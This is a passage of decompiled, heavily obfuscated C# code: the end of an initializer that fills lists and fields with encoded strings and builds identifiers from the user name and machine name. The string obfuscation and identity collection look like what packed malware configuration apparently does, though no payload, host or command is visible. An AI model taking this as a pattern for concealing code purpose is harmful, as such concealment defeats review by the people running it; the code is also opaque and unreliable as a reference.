			KPabEeiJZVewrU(getString_0(107412247)),
			KPabEeiJZVewrU(getString_0(107412234)),
			KPabEeiJZVewrU(getString_0(107412201)),
			KPabEeiJZVewrU(getString_0(107412168)),
			KPabEeiJZVewrU(getString_0(107412135)),
			KPabEeiJZVewrU(getString_0(107412102)),
			KPabEeiJZVewrU(getString_0(107412581)),
			KPabEeiJZVewrU(getString_0(107412540)),
			KPabEeiJZVewrU(getString_0(107412467)),
			KPabEeiJZVewrU(getString_0(107412454)),
			KPabEeiJZVewrU(getString_0(107412421)),
			KPabEeiJZVewrU(getString_0(107412380)),
			KPabEeiJZVewrU(getString_0(107411803)),
			KPabEeiJZVewrU(getString_0(107411762)),
			KPabEeiJZVewrU(getString_0(107411753)),
			KPabEeiJZVewrU(getString_0(107411720)),
			KPabEeiJZVewrU(getString_0(107411679)),
			KPabEeiJZVewrU(getString_0(107411646)),
			KPabEeiJZVewrU(getString_0(107413000)),
			KPabEeiJZVewrU(getString_0(107411573)),
			KPabEeiJZVewrU(getString_0(107412044)),
			KPabEeiJZVewrU(getString_0(107412031)),
			KPabEeiJZVewrU(getString_0(107411998)),
			KPabEeiJZVewrU(getString_0(107411925)),
			KPabEeiJZVewrU(getString_0(107411884)),
			KPabEeiJZVewrU(getString_0(107411883)),
			KPabEeiJZVewrU(getString_0(107411842)),
			KPabEeiJZVewrU(getString_0(107411257)),
			KPabEeiJZVewrU(getString_0(107412967)),
			KPabEeiJZVewrU(getString_0(107411216)),
			KPabEeiJZVewrU(getString_0(107412890)),
			KPabEeiJZVewrU(getString_0(107411183)),
			KPabEeiJZVewrU(getString_0(107411150)),
			KPabEeiJZVewrU(getString_0(107411141)),
			KPabEeiJZVewrU(getString_0(107411108)),
			KPabEeiJZVewrU(getString_0(107411547)),
			KPabEeiJZVewrU(getString_0(107411506)),
			KPabEeiJZVewrU(getString_0(107411473)),
			KPabEeiJZVewrU(getString_0(107411440)),
			KPabEeiJZVewrU(getString_0(107411431)),
			KPabEeiJZVewrU(getString_0(107411390)),
			KPabEeiJZVewrU(getString_0(107411317))
		};
		bverOuZzCjzkYh = new List<string>
		{
			KPabEeiJZVewrU(ITFOBjLBjn(getString_0(107410764))),
			KPabEeiJZVewrU(getString_0(107410715)),
			KPabEeiJZVewrU(getString_0(107410654)),
			KPabEeiJZVewrU(getString_0(107410557)),
			KPabEeiJZVewrU(getString_0(107410976)),
			KPabEeiJZVewrU(getString_0(107410879)),
			KPabEeiJZVewrU(getString_0(107410274)),
			KPabEeiJZVewrU(getString_0(107410177)),
			KPabEeiJZVewrU(getString_0(107410084)),
			KPabEeiJZVewrU(getString_0(107410499)),
			KPabEeiJZVewrU(getString_0(107410406)),
			KPabEeiJZVewrU(getString_0(107410309)),
			KPabEeiJZVewrU(getString_0(107409704)),
			KPabEeiJZVewrU(ITFOBjLBjn(getString_0(107410764)))
		};
		LABFsmtCCegTkuJ = KPabEeiJZVewrU(getString_0(107409607));
		cIDpbJJYzpDACkyZ = new List<string>
		{
			KPabEeiJZVewrU(getString_0(107409974)),
			KPabEeiJZVewrU(getString_0(107409780)),
			KPabEeiJZVewrU(getString_0(107409074)),
			KPabEeiJZVewrU(getString_0(107409392)),
			KPabEeiJZVewrU(getString_0(107408686)),
			KPabEeiJZVewrU(getString_0(107408492))
		};
		zziMgJgWEnmo = new List<string>
		{
			KPabEeiJZVewrU(getString_0(107408842)),
			KPabEeiJZVewrU(getString_0(107408749)),
			KPabEeiJZVewrU(getString_0(107408176))
		};
		XtJDIFKdBObFiw = getString_0(107396936);
		EXDBcCojQQvCl = getString_0(107396936);
		bpInvtMjNHqeLp = new DateTime(2000, 1, 1);
		tGMUsFQXYBMSN = new DateTime(2100, 1, 1);
		sxiybUGjmYR = getString_0(107396931);
		ddqPQmPoIWuW = getString_0(107390580);
		PslbkyAstfhCvy = getString_0(107396936);
		tmCVPqkAAjA = getString_0(107396936);
		guhyIlZJDhBff = getString_0(107396936);
		SGqxsgTFYyviwIq = getString_0(107396931);
		HTzSscqOJXN = getString_0(107396936);
		LZOxaUWpmIj = getString_0(107396936);
		izJuaPEIDwBM = new List<string>
		{
			getString_0(107395946),
			getString_0(107396140),
			getString_0(107396460),
			getString_0(107396021)
		};
		IxktWyCSAKdLJt = getString_0(107396936);
		kyMVozVHGsuV = getString_0(107408115);
		nBBaMBwclRdY = getString_0(107396936);
		eLAKMpocHKWXQA = getString_0(107396936);
		wxfzHyrcJlhzsh = getString_0(107396936);
		mxdlyhKIDSTRaTYm = string.Empty;
		jlIrvgyvehPHe = getString_0(107396936);
		zpvKPwOvMg = getString_0(107396936);
		iEaWQONmdzBb = getString_0(107396936);
		UdJFCQjIIgDVCcJx = getString_0(107392858);
		FtYCpnUUMTIV = getString_0(107392858);
		lOlLtOMnnINKpPby = getString_0(107396936);
		qUeurzogGuEr = getString_0(107396936);
		PdbbQHuALFK = getString_0(107396931);
		cONWpzhRjVMgFFx = getString_0(107396936);
		ePzQPhveUhWlVqR = getString_0(107396936);
		gYArJbPZXqc = getString_0(107408110);
		fjXGCiDvGtI = getString_0(107396936);
		PeyEcwpHdsoP = getString_0(107396936);
		ndkamOclOKnVzv = getString_0(107408125);
		mmEKKRaGkloGcs = getString_0(107396936);
		dpYnCeeOXRK = getString_0(107396936);
		tczWceTePBNk = getString_0(107396936);
		uQIcndqWKi = getString_0(107396936);
		rLXXesjrDyx = getString_0(107408104);
		JOcipvPYcTk = getString_0(107396931);
		PntwKUgOTt = getString_0(107396936);
		ZxiAJVQkOJDu = getString_0(107396936);
		jDqdPPwKfsddQK = getString_0(107396936);
		neDnepJoXuKRz = new string[0];
		hEPyWDyzsMB = getString_0(107396931);
		USeABfWDSTq = true;
		qblzYDGPsQVpSW = getString_0(107396936);
		lPNPDgvBRE = false;
		zmxvEjsHnfbn = false;
		QsoMeYyWMnmx = false;
		ygakoNEzKgXaDh = true;
		AJkkstCArH = getString_0(107408059);
		IyKNhTqRuk = false;
		UaNQOmUgyjoiBm = false;
		BnwSrkzPcxb = false;
		wvpBCFJLeJ = false;
		NHbEtBQcjaHtXtG = true;
		IeDcjQWHRqqVRp = getString_0(107408070) + Environment.UserName + getString_0(107408025) + Environment.MachineName + getString_0(107408036) + pkkGXNrkowS.NOJMgYxKOBYDCh() + getString_0(107408031);
		jFyBcBKPTJEuUw = false;
		mnyvtnKGKARfh = new Stopwatch();
		LuhgDZXWifkSE = 0;
		UOSpFwBdRnM = 0;
		yemgLyczOOW = true;
		htotHetAeUsCN = getString_0(107407990) + pkkGXNrkowS.NOJMgYxKOBYDCh() + getString_0(107407981);
	}
}
